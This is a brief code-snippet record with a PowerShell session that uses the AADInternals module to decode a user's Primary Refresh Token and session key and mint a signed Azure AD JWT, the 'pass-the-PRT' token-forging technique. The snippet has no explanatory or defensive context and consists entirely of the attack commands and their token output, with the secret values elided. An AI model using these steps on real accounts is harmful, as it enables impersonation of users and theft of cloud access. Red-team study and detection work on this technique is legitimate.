---
id: 5e4cc9a7-b393-483c-bea0-5ff2c532bf51
type: code
language: Powershell
verified: false
created_at: '2023-05-25T05:46:38.405230+00:00'
updated_at: '2023-05-25T07:04:18.490219+00:00'
---

# Code Snippet 5e4cc9a7

**Language**: Powershell

```powershell
# Generate a JWT
PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
PS AADInternals> $PRT_OF_USER = '...'
PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
PS AADInternals> $ClearKey = "XXYYZZ..."
PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
eyJ0eXAiOiJKV1QiL...
```


